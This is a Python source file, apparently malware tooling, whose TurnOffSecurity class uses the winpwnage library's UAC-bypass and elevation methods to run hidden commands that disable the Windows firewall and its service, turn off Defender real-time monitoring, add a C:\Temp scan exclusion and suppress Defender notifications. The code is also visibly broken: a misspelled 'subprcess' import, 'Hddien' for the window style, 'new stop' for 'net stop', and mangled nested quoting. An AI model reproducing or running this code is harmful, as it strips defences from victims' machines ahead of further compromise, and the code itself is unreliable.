__import__('sys').path.append('../')
import subprcess
from winpwnage.functions.uac.uacMethod1 import uacMethod1
from winpwnage.functions.elevate.elevateMethod1 import elevateMethod1

class TurnOffSecurity(object):
	def __init__(self):
		super(TurnOffSecurity, self).__init__()
		
	def FireWall(self):
		stop_firewall = 'powershell -WindowStyle Hddien -Command "Set-NetFirewallProfile -Enabled False"'
		stop_firewall_service = 'net stop mpssvc'
		uacMethod1(['c:\\windows\\system32\\cmd.exe', '/c', stop_firewall])
		uacMethod1(['c:\\windows\\system32\\cmd.exe', '/c', stop_firewall_service])
		elevateMethod1(['c:\\windows\\system32\\cmd.exe', '/c', stop_firewall])
		elevateMethod1(['c:\\windows\\system32\\cmd.exe', '/c', stop_firewall_service])

	def Defender(self):
		stop_defender = 'powershell -WindowStyle Hddien -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
		stop_defender_service = 'new stop Sense'
		add_exclusion = 'powershell -WindowStyle Hddien -Command "Set-MpPreference -ExclusionPath C:\\Temp"'
		off_notifications = r'powershell -WindowStyle Hddien -Command "Set-ItemProperty -Path "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Type DWord -Value 1"'
		uacMethod1(['c:\\windows\\system32\\cmd.exe', '/c', stop_defender])
		uacMethod1(['c:\\windows\\system32\\cmd.exe', '/c', stop_defender_service])
		uacMethod1(['c:\\windows\\system32\\cmd.exe', '/c', add_exclusion])
		uacMethod1(['c:\\windows\\system32\\cmd.exe', '/c', off_notifications])
		elevateMethod1(['c:\\windows\\system32\\cmd.exe', '/c', stop_defender])
		elevateMethod1(['c:\\windows\\system32\\cmd.exe', '/c', stop_defender_service])
		elevateMethod1(['c:\\windows\\system32\\cmd.exe', '/c', add_exclusion])
		elevateMethod1(['c:\\windows\\system32\\cmd.exe', '/c', off_notifications])

